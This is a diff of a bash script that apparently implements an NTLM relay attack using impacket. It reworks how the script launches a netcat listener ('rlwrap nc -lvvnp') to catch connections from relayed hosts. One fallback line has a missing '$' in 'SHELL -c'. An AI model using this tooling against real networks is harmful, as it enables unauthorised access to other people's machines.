@@ -54,7 +54,7 @@ function goodExit(){
 
 function ctrl_c(){
 
-	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting..."; badExit
+	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...\n"; badExit
 	
 }
 
@@ -343,20 +343,18 @@ function relayingAttack(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.3; fi
 
-	terminal='xterm'
-	for ps in $(ps ax | awk '{print $5}' | sort -u | grep -v "\[\|\/" | awk -F- '{print $1}'); do
-		tput -T $ps longname &>/dev/null
-		if [[ $? -eq 0 && "$ps" != "tmux" ]];then terminal=$ps; break; fi
-	done
+	checkDependency "rlwrap"
 
-	command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport'"
-	if [ $terminal == "gnome" ];then 
-		gnome-terminal --window --hide-menubar -e "$command" &> /dev/null &
-	elif [ $terminal == "termite" ];then
-		termite -hold -e "$command" &>/dev/null &
-	else
-        checkDependency "xterm"; checkDependency "rlwrap"
-	    xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
+	terminal=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
+	ncCommand='tput setaf 7; rlwrap nc -lvvnp '$lport
+	$terminal -hold -T $terminal -e "$SHELL -c '$ncCommand'" &>/dev/null && sleep 1
+	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then 
+		$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null && sleep 1	
+	fi
+
+	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then 
+		checkDependency "xterm"; 
+		xterm -hold -T 'XTerm' -e "SHELL -c '$ncCommand'" &>/dev/null 
 	fi
 	terminal_nc_PID=$!
 	
@@ -385,7 +383,7 @@ function relayingAttack(){
 		done < $(pwd)/impacket/targets.txt
 
 		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt | awk '{print $1}')" ]];then
-			echo -e "${redColour}[:(]${endColour} No targets left to perform the relay\n"; badExit
+			echo -e "\t${redColour}[:(]${endColour} No targets left to perform the relay\n"; break
 		fi
 		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
 	done
